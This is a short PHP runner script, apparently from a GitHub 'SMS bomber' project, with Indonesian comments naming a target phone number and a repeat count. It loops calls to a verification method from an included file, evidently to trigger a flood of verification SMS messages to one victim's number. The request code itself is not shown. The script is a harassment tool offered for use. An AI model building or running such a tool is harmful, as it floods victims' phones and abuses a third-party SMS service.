<?php
include 'funcZipay.php';

/*
    https://github.com/nee48/BomSmsZipay
    Made by Handika Pratama
*/

$init = new Bom();

//Eksekusi Sms Boomber
$init->no = ""; //Nomer Hp tujuan
$loop = ""; //Jumlah eksekusi
for ($i=0; $i < $loop; $i++) { 
    $init->Verif($init->no);
}